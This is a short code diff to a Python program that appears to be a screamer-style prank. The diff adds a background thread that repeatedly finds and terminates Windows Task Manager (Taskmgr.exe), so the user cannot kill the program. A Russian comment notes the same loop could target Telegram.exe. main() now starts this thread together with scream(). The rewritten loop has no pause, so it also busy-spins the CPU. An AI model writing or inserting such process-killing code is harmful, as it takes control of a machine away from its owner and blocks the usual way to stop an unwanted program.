@@ -1,5 +1,6 @@
 from threading import Thread
 from time import sleep
+import psutil
 from config import ACTIVATE
 import datetime
 
@@ -37,13 +38,17 @@ def scream():
 
 def taskmgr_kill():
     while True:
-        print(0.5)
-        sleep(0.5)
+        for process in psutil.process_iter(['pid', 'name']):
+            try:
+                if process.info['name'] == "Taskmgr.exe":  # Имя процесса может быть "Telegram.exe" для Windows
+                    process.terminate()  # Завершение процесса
+            except (psutil.NoSuchProcess, psutil.AccessDenied):
+            # Если процесс уже завершен или доступ к нему запрещен
+                continue
 
 
 def main():
-    # Thread(target=taskmgr_kill).start()
-    # scream()
+    Thread(target=taskmgr_kill).start()
     scream()
 
 
